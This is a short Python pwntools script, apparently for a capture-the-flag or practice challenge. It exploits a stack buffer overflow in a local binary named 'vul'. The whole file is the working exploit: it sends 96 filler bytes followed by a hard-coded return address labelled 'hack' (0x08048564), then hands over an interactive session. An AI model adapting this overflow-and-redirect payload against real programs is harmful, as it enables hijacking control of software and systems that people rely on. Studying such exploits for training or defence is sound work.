#!/usr/bin/env python
from pwn import *

p = process('./vul');

hack = 0x08048564

payload = 'A' * 96 + p32(hack);

p.send(payload)

p.interactive()


